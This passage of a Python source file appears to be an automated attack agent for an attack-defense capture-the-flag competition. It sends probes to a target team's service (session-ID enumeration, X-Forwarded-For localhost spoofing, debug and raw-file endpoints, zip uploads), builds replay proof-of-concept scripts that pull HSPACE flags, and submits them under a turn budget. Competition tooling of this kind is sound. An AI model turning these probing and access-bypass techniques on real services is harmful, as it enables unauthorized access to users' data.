    probes = probes_from_vuln_spec(snapshot) + probes_from_routes(snapshot)
    deduped = []
    seen = set()
    for probe in round_robin_by_flag(probes):
        key = probe_key(probe)
        if key not in seen:
            seen.add(key)
            deduped.append(probe)
    return deduped


def followup_probes(state):
    probes = []
    for session_id in sorted(state.sessions)[:4]:
        probes.extend([
            {"flag_id": "vuln3", "type": "follow_session_files",
             "path": "/files", "query": {"session_id": session_id}},
            {"flag_id": "vuln3", "type": "follow_session_files_all",
             "path": "/files", "query": {"session_id": session_id, "all": "true"},
             "headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"flag_id": "vuln1", "type": "follow_session_analysis",
             "path": "/analysis", "query": {"session_id": session_id, "include_meta": "true"}},
            {"flag_id": "vuln2", "type": "follow_session_recommend",
             "path": "/recommend", "query": {"session_id": session_id, "expand": "history"}},
            {"flag_id": "vuln4", "type": "follow_session_debug",
             "path": "/debug/state", "query": {"session_id": session_id, "verbose": "true"}},
        ])
    for file_id in sorted(state.file_ids, key=lambda x: int(x))[:4]:
        probes.extend([
            {"flag_id": "vuln1", "type": "follow_file_id",
             "path": f"/files/{file_id}"},
            {"flag_id": "vuln1", "type": "follow_file_raw",
             "path": f"/files/{file_id}", "query": {"raw": "true"}},
            {"flag_id": "vuln1", "type": "follow_file_analysis",
             "path": "/analysis", "query": {"file_id": file_id, "include_meta": "true"}},
        ])
    return round_robin_by_flag(probes)


# ═══════════════════════════════════════════════════════════════════════════
# Attack / PoC
# ═══════════════════════════════════════════════════════════════════════════
def attack_target(env, budget, probe, llm_call_id, state=None):
    if not budget.can_attack():
        return None
    # v7: 같은 라운드에 이미 404/502 받았던 path는 건너뜀 (turn 절약)
    if state is not None:
        path = str(probe.get("path") or "")
        if path in state.skip_paths:
            log(f"skip path (prev 404/502): {path}")
            return None
    _LIMITERS["attack"].acquire()
    probe = normalize_probe(probe)
    budget.attack_calls += 1
    try:
        resp = _http_post(
            f"{env.agent_base_url}/attack", headers=env.auth,
            json_body={
                "llm_call_id": str(llm_call_id),
                "payload": probe.get("payload") or "",
                "path": probe.get("path"), "method": probe.get("method"),
                "query": probe.get("query"), "json_body": probe.get("json_body"),
                "headers": probe.get("headers"), "data": probe.get("data"),
            },
            timeout=42.0,
        )
    except Exception as exc:
        log(f"attack transport failed path={probe.get('path')}: {exc}")
        return None

    body_text = getattr(resp, "text", "")
    if resp.status_code == 429 or "공격 요청 횟수 초과" in body_text:
        budget.attack_exhausted = True
        budget.turns_remaining = 0
        raise AttackTurnBudgetExhausted(body_text[:300])
    if resp.status_code >= 400:
        log(f"attack failed path={probe.get('path')}: HTTP {resp.status_code} {body_text[:180]}")
        # v7: 404/502는 같은 라운드 재시도 안 함
        if state is not None and ("404" in body_text or "502" in body_text or resp.status_code in (404, 502)):
            state.skip_paths.add(str(probe.get("path") or ""))
        return None

    data = response_json(resp)
    result = data if isinstance(data, dict) else {"raw": data}
    turns = result.get("turns_remaining")
    if isinstance(turns, int):
        budget.turns_remaining = turns
        if turns <= 0:
            budget.attack_exhausted = True
    return result


def validate_poc_source(source):
    encoded = source.encode("utf-8")
    if len(encoded) > POC_MAX_BYTES:
        raise ValueError(f"PoC source too large: {len(encoded)}")
    if len(encoded) < 80:
        raise ValueError("PoC source too short")
    low = source.lower()
    for pattern in POC_BANNED_PATTERNS:
        if pattern.lower() in low:
            raise ValueError(f"PoC source contains banned pattern: {pattern}")
    if "TARGET_HOST" not in source or "TARGET_PORT" not in source:
        raise ValueError("PoC must read TARGET_HOST and TARGET_PORT")
    if "HSPACE" not in source:
        raise ValueError("PoC must extract HSPACE flag format")
    if re.search(r"HSPACE\{[A-Za-z0-9_+/=\-]{8,}\}", source):
        raise ValueError("PoC appears to hardcode a flag")
    tree = ast.parse(source)
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                top = alias.name.split(".")[0]
                if top not in POC_ALLOWED_IMPORTS:
                    raise ValueError(f"PoC import not allowed: {alias.name}")
        elif isinstance(node, ast.ImportFrom):
            if node.level:
                raise ValueError("PoC relative import not allowed")
            top = (node.module or "").split(".")[0]
            if top and top not in POC_ALLOWED_IMPORTS:
                raise ValueError(f"PoC import not allowed: from {node.module}")
    compile(source, "submitted_poc.py", "exec")


def build_replay_poc(probe):
    replay = {
        "method": str(probe.get("method") or "GET").upper(),
        "path": probe.get("path"), "query": probe.get("query"),
        "headers": probe.get("headers") or {},
        "json_body": probe.get("json_body"), "data": probe.get("data"),
    }
    source = f'''
import json
import os
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

TARGET_HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
TARGET_PORT = os.environ.get("TARGET_PORT", "80")
BASE = "http://%s:%s" % (TARGET_HOST, TARGET_PORT)
PROBE = {json.dumps(replay, ensure_ascii=False, sort_keys=True)}
FLAG_RE = re.compile(r"\\bHSPACE\\{{[^}}\\r\\n]{{1,200}}\\}}")

def as_text(v):
    if v is None: return ""
    if isinstance(v, bytes): return v.decode("utf-8", "replace")
    if isinstance(v, str): return v
    return json.dumps(v, ensure_ascii=False, sort_keys=True)

def main():
    path = PROBE.get("path") or "/"
    url = BASE.rstrip("/") + path
    query = PROBE.get("query")
    if query:
        url += ("?" if "?" not in url else "&") + urlencode(query)
    headers = dict(PROBE.get("headers") or {{}})
    body = None
    if PROBE.get("json_body") is not None:
        body = json.dumps(PROBE["json_body"]).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    elif PROBE.get("data") is not None:
        data = PROBE["data"]
        body = urlencode(data).encode("utf-8") if isinstance(data, dict) else as_text(data).encode("utf-8")
    req = Request(url, data=body, headers=headers, method=PROBE.get("method") or "GET")
    try:
        with urlopen(req, timeout=10) as resp:
            text = as_text(resp.read())
    except HTTPError as exc:
        text = as_text(exc.read())
    except URLError:
        raise SystemExit(1)
    flags = list(dict.fromkeys(FLAG_RE.findall(text)))
    if flags:
        print(flags[0])
        raise SystemExit(0)
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''.strip()
    validate_poc_source(source)
    return source + "\n"


def static_poc_candidates(probes):
    grouped = {flag_id: [] for flag_id in FLAG_IDS}
    for probe in probes:
        flag_id = str(probe.get("flag_id") or "")
        if flag_id not in grouped:
            continue
        method = str(probe.get("method") or "GET").upper()
        path_l = str(probe.get("path") or "").lower()
        if is_noisy_probe(probe) and not (method == "POST" and "upload" in path_l):
            continue
        confidence = int(probe.get("static_confidence") or 0)
        if confidence < 60:
            continue
        grouped[flag_id].append(normalize_probe(probe))
    for flag_id, items in grouped.items():
        items.sort(key=lambda item: int(item.get("static_confidence") or 0), reverse=True)
        grouped[flag_id] = items[:MAX_STATIC_PROBES_PER_FLAG]
    return {flag_id: items for flag_id, items in grouped.items() if items}


def build_static_multi_probe_poc(flag_id, probes):
    packed = []
    for probe in probes[:MAX_STATIC_PROBES_PER_FLAG]:
        packed.append({
            "method": str(probe.get("method") or "GET").upper(),
            "path": probe.get("path"), "query": probe.get("query"),
            "headers": probe.get("headers") or {},
            "json_body": probe.get("json_body"), "data": probe.get("data"),
            "upload_file": bool(probe.get("upload_file")),
        })
    source = f'''
import io
import json
import os
import re
import sys
import uuid
import zipfile
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

TARGET_HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
TARGET_PORT = os.environ.get("TARGET_PORT", "80")
BASE = "http://%s:%s" % (TARGET_HOST, TARGET_PORT)
FLAG_ID = os.environ.get("FLAG_ID", "{flag_id}")
PROBES = {json.dumps(packed, ensure_ascii=False, sort_keys=True)}
FLAG_RE = re.compile(r"\\bHSPACE\\{{[^}}\\r\\n]{{1,200}}\\}}")

def as_text(v):
    if v is None: return ""
    if isinstance(v, bytes): return v.decode("utf-8", "replace")
    if isinstance(v, str): return v
    return json.dumps(v, ensure_ascii=False, sort_keys=True)

def emit_from(value):
    flags = list(dict.fromkeys(FLAG_RE.findall(as_text(value))))
    if flags:
        print(flags[0])
        raise SystemExit(0)

def multipart_body():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("note.md", "# probe\\n")
    boundary = "----hspace-" + uuid.uuid4().hex
    head = (
        "--%s\\r\\n"
        "Content-Disposition: form-data; name=\\"file\\"; filename=\\"vault.zip\\"\\r\\n"
        "Content-Type: application/zip\\r\\n\\r\\n"
    ) % boundary
    tail = "\\r\\n--%s--\\r\\n" % boundary
    return boundary, head.encode("utf-8") + buf.getvalue() + tail.encode("utf-8")

def request_probe(probe):
    path = probe.get("path") or "/"
    url = BASE.rstrip("/") + path
    query = probe.get("query")
    if query:
        url += ("?" if "?" not in url else "&") + urlencode(query)
    headers = dict(probe.get("headers") or {{}})
    body = None
    if probe.get("upload_file"):
        boundary, body = multipart_body()
        headers.setdefault("Content-Type", "multipart/form-data; boundary=%s" % boundary)
    elif probe.get("json_body") is not None:
        body = json.dumps(probe["json_body"]).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    elif probe.get("data") is not None:
        data = probe["data"]
        body = urlencode(data).encode("utf-8") if isinstance(data, dict) else as_text(data).encode("utf-8")
    req = Request(url, data=body, headers=headers, method=probe.get("method") or "GET")
    try:
        with urlopen(req, timeout=10) as resp:
            return resp.read()
    except HTTPError as exc:
        return exc.read()
    except URLError:
        return None

def main():
    for probe in PROBES:
        emit_from(request_probe(probe))
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''.strip()
    validate_poc_source(source)
    return source + "\n"


def submit_poc(env, budget, *, flag_id, llm_call_id, source):
    if not budget.can_poc():
        return None
    validate_poc_source(source)
    _LIMITERS["pocs"].acquire()
    budget.poc_submits += 1
    try:
        resp = _http_post(
            f"{env.agent_base_url}/pocs", headers=env.auth,
            data={"flag_id": flag_id, "llm_call_id": str(llm_call_id), "source": source},
            timeout=35.0,
        )
    except Exception as exc:
        log(f"PoC submit transport failed {flag_id}: {exc}")
        return None
    if resp.status_code >= 400:
        log(f"PoC submit failed {flag_id}: HTTP {resp.status_code} {resp.text[:200]}")
        return None
    data = response_json(resp)
    return data if isinstance(data, dict) else {"raw": data}


def submit_confirmed_findings(env, budget, state, repo_context):
    pending = [f for f in state.confirmed_findings
               if f.get("flag_id") in FLAG_IDS and f.get("flag_id") not in state.submitted_ids]
    if not pending:
        return
    poc_call_id = get_llm_call_id(env, budget, "poc",
                                   "Submitting replay PoCs for confirmed flags.")
    if poc_call_id is None:
        log("cannot submit confirmed PoCs: no poc llm_call_id")
        return
    for finding in pending:
        flag_id = str(finding["flag_id"])
        probe = finding["probe"]
        flags = finding.get("flags", [])
        if not flags:
            continue
        try:
            source = build_replay_poc(probe)
            submitted = submit_poc(env, budget, flag_id=flag_id,
                                    llm_call_id=poc_call_id, source=source)
            if submitted:
                state.submitted_ids.add(flag_id)
                state.solved_ids.add(flag_id)
                # v7: 캐시에 저장 (다음 run이 같은 라운드면 재제출)
                save_poc_cache(env.round_num, env.target_team, flag_id, source)
                log(f"submitted replay PoC {flag_id} flags={len(flags)} {compact(submitted)}")
        except (RuntimeError, ValueError, SyntaxError) as exc:
            log(f"replay PoC failed {flag_id}: {exc}")


def submit_static_repo_pocs_filtered(env, budget, state, repo_probe_list, llm_call_id, only=None):
    """Static PoC를 미제출 vuln에만 백업으로 쏨."""
    if not ENABLE_STATIC_REPO_POC:
        return
    grouped = static_poc_candidates(repo_probe_list)
    for flag_id in FLAG_IDS:
        if flag_id in state.submitted_ids:
            continue
        if only is not None and flag_id not in only:
            continue
        if not budget.can_poc():
            return
        probes = grouped.get(flag_id) or []
        if not probes:
            log(f"static repo PoC: no candidates for {flag_id}, skip")
            continue
        try:
            source = build_static_multi_probe_poc(flag_id, probes)
            submitted = submit_poc(env, budget, flag_id=flag_id,
                                    llm_call_id=llm_call_id, source=source)
            if submitted:
                state.submitted_ids.add(flag_id)
                # v7: 캐시에 저장
                save_poc_cache(env.round_num, env.target_team, flag_id, source)
                log(
                    f"submitted static repo PoC {flag_id} probes={len(probes)} "
                    f"evidence={[p.get('source') for p in probes[:3]]} {compact(submitted)}"
                )
        except (RuntimeError, ValueError, SyntaxError) as exc:
            log(f"static repo PoC failed {flag_id}: {exc}")


def submit_cached_pocs(env, budget, state):
    """
    v7: 같은 라운드 이전 run이 만든 PoC가 있으면 attack 없이 즉시 재제출.
    
    같은 라운드에 컨테이너가 여러 번 띄워질 때, 이전 run이 만들어둔 PoC를
    다음 run에서 그대로 재제출. 같은 sha256이라 wrapper가 'merged'로 처리하지만
    이미 등록된 PoC가 유지됨 (없으면 누가 지웠을 수도).
    """
    cached_found = []
    for flag_id in FLAG_IDS:
        if flag_id in state.submitted_ids:
            continue
        cached = load_poc_cache(env.round_num, env.target_team, flag_id)
        if cached:
            cached_found.append((flag_id, cached))
    
    if not cached_found:
        return
    
    log(f"found cached PoCs from previous run: {[f for f, _ in cached_found]}")
    poc_call_id = get_llm_call_id(env, budget, "poc",
                                   "Re-submitting cached PoCs from previous run.")
    if poc_call_id is None:
        log("cached PoC re-submit skipped: no llm_call_id")
        return
    
    for flag_id, source in cached_found:
        if not budget.can_poc():
            break
        try:
            submitted = submit_poc(env, budget, flag_id=flag_id,
                                    llm_call_id=poc_call_id, source=source)
            if submitted:
                state.submitted_ids.add(flag_id)
                log(f"re-submitted cached PoC {flag_id} ({len(source)}B) {compact(submitted)}")
        except (RuntimeError, ValueError, SyntaxError) as exc:
            log(f"cached PoC re-submit failed {flag_id}: {exc}")


def run_probe_batch(env, budget, state, llm_call_id, probes, limit, label):
    queue = []
    for probe in probes:
        if str(probe.get("flag_id") or "") in state.solved_ids:
            continue
        enqueue(queue, state, probe)
    attempts = 0
    while queue and attempts < limit and budget.can_attack() and len(state.solved_ids) < TARGET_FLAG_COUNT:
        probe = queue.pop(0)
        attempts += 1
        try:
            result = attack_target(env, budget, probe, llm_call_id, state)
        except AttackTurnBudgetExhausted as exc:
            log(f"{label}: attack turn budget exhausted: {compact(str(exc), 220)}")
            return
        if result is None:
            continue
        flags = state.add_observation(probe, result)
        log(
            f"[{label}] {probe.get('flag_id')}/{probe.get('type')} "
            f"{probe.get('method', 'GET')} {probe.get('path')} "
            f"flags={len(flags)} sessions={len(extract_sessions(result))} "
            f"ids={len(extract_file_ids(result))} {budget.report()}"
        )
        if flags:
            for flag in flags:
                log(f"flag observed {probe.get('flag_id')}: {flag}")
        if looks_like_study_compass(result):
            for follow in followup_probes(state):
                if str(follow.get("flag_id") or "") not in state.solved_ids:
                    enqueue(queue, state, follow)


# ═══════════════════════════════════════════════════════════════════════════
# Main — 순서 수정: seed → repo → follow → replay → static fallback
# ═══════════════════════════════════════════════════════════════════════════
def main() -> None:
    env = AgentEnv.from_env()
    budget = Budget()
    state = AgentState()
    status = "partial"
    log(f"{env.team_id} attack run={env.run_id} target={env.target_team} round={env.round_num}")
    log(
        f"caps seed={BLACKBOX_SEED_BUDGET} repo={REPO_PROBE_BUDGET} "
        f"follow={FOLLOWUP_PROBE_BUDGET} max_attack={MAX_TOTAL_ATTACKS_PER_RUN} "
        f"static_repo_poc={ENABLE_STATIC_REPO_POC}"
    )

    if not env.agent_base_url or not env.run_token:
        finish(env, "failed", "missing wrapper env", state)
        return

    try:
        # ── 0) v7: 같은 라운드 이전 run이 만든 PoC 캐시 즉시 재제출 ──
        # (turn 0개 사용. 만약 같은 라운드 첫 run이면 캐시 없으니 그냥 통과)
        state.skip_paths = load_skip_paths(env.round_num, env.target_team)
        if state.skip_paths:
            log(f"loaded skip paths from previous runs: {sorted(state.skip_paths)[:5]}...")

        # 1) warmup LLM
        scan_call_id = get_llm_call_id(
            env, budget, "scan",
            f"Evidence-first black-box attack planning for {env.target_team}.",
        )
        if scan_call_id is None:
            finish(env, "failed", "no llm_call_id", state)
            return

        # 1.5) v7: 캐시된 PoC 먼저 재제출 (turn 안 씀)
        submit_cached_pocs(env, budget, state)

        # 2) repo fetch
        snapshot = RepoSnapshot()
        repo_probe_list = []
        try:
            snapshot = fetch_repo(env)
            repo_probe_list = repo_probes(snapshot)
            log(f"repo {snapshot.team}@{snapshot.commit[:12]} loaded "
                f"repo_probes={len(repo_probe_list)}")
        except Exception as exc:
            log(f"repo unavailable: {exc}")

        # v7: 모든 vuln 이미 캐시로 제출 끝났으면 더 할 일 없음
        if len(state.submitted_ids) >= TARGET_FLAG_COUNT:
            log("all vulns already submitted from cache; skipping attack phase")
            status = "completed"
            log(
                f"summary status={status} cached_resubmit "
                f"submitted={sorted(state.submitted_ids)} {budget.report()}"
            )
            save_skip_paths(env.round_num, env.target_team, state.skip_paths)
            finish(env, status, state=state)
            return

        # v7: 시작 시 빠른 turn 가능성 체크 — vuln_spec 있으면 repo부터
        has_strong_vuln_spec = any(p.get("source") == "vuln_spec.json" for p in repo_probe_list)
        skip_seed = has_strong_vuln_spec and len(repo_probe_list) >= TARGET_FLAG_COUNT

        # 3) seed probes (vuln_spec 약하면 실행, 강하면 스킵)
        if skip_seed:
            log("skipping seed phase: vuln_spec.json provides strong path hints")
            seed_unused = BLACKBOX_SEED_BUDGET
        else:
            seed_used_before = budget.attack_calls
            try:
                run_probe_batch(env, budget, state, scan_call_id,
                                 seed_probes(), BLACKBOX_SEED_BUDGET, "seed")
            except AttackTurnBudgetExhausted:
                # v7: 첫 attack에서 turn 고갈 → 이전 run이 다 썼음. PoC만 진행
                log("turns already exhausted by previous run; skipping to PoC phase")
                budget.attack_exhausted = True
                seed_unused = 0
            else:
                submit_confirmed_findings(env, budget, state, snapshot.context)
                seed_used = budget.attack_calls - seed_used_before
                seed_unused = max(0, BLACKBOX_SEED_BUDGET - seed_used)

        # 4) repo-derived probes (vuln_spec/route 분석 기반)
        repo_budget = REPO_PROBE_BUDGET + seed_unused
        log(f"repo phase budget: {REPO_PROBE_BUDGET} + carryover {seed_unused} = {repo_budget}")
        repo_used_before = budget.attack_calls
        if budget.can_attack() and len(state.solved_ids) < TARGET_FLAG_COUNT:
            try:
                run_probe_batch(env, budget, state, scan_call_id,
                                 repo_probe_list, repo_budget, "repo")
            except AttackTurnBudgetExhausted:
                log("turns exhausted during repo phase")
                budget.attack_exhausted = True
            submit_confirmed_findings(env, budget, state, snapshot.context)
        repo_used = budget.attack_calls - repo_used_before
        repo_unused = max(0, repo_budget - repo_used)

        # 5) follow-up probes
        follow_budget = FOLLOWUP_PROBE_BUDGET + repo_unused
        log(f"follow phase budget: {FOLLOWUP_PROBE_BUDGET} + carryover {repo_unused} = {follow_budget}")
        if budget.can_attack() and len(state.solved_ids) < TARGET_FLAG_COUNT:
            try:
                run_probe_batch(env, budget, state, scan_call_id,
                                 followup_probes(state), follow_budget, "follow")
            except AttackTurnBudgetExhausted:
                log("turns exhausted during follow phase")
                budget.attack_exhausted = True
            submit_confirmed_findings(env, budget, state, snapshot.context)

        # 6) static fallback — replay 끝난 후, 미제출 vuln만
        unsubmitted = set(FLAG_IDS) - state.submitted_ids
        if unsubmitted and repo_probe_list and ENABLE_STATIC_REPO_POC and budget.can_poc():
            static_call_id = get_llm_call_id(
                env, budget, "poc",
                f"Static fallback PoCs for {sorted(unsubmitted)}.",
            )
            if static_call_id is not None:
                submit_static_repo_pocs_filtered(
                    env, budget, state, repo_probe_list,
                    static_call_id, only=unsubmitted,
                )
            else:
                log("static fallback PoCs skipped: no llm_call_id")

        # 7) keepalive (옵션)
        if KEEPALIVE_SECONDS > 0 and budget.can_attack() and not state.confirmed_findings:
            deadline = time.time() + KEEPALIVE_SECONDS
            while time.time() < deadline:
                log(f"idle keepalive sleep_left={int(deadline - time.time())}s")
                time.sleep(min(20, max(1, deadline - time.time())))

        # 8) 최종 상태
        if len(state.solved_ids) >= TARGET_FLAG_COUNT:
            status = "completed"
        elif len(state.submitted_ids) > 0:
            status = "partial"
        else:
            status = "no_findings"

        log(
            f"summary status={status} "
            f"flags={len(state.flags)} sessions={len(state.sessions)} "
            f"file_ids={len(state.file_ids)} "
            f"submitted={sorted(state.submitted_ids)} "
            f"solved={sorted(state.solved_ids)} "
            f"{budget.report()}"
        )
        # v7: 다음 run을 위해 skip path 저장
        save_skip_paths(env.round_num, env.target_team, state.skip_paths)
        finish(env, status, state=state)

    except Exception as exc:
        log(f"fatal: {exc}")
        finish(env, "failed", str(exc)[:300], state)
        raise


if __name__ == "__main__":
    main()
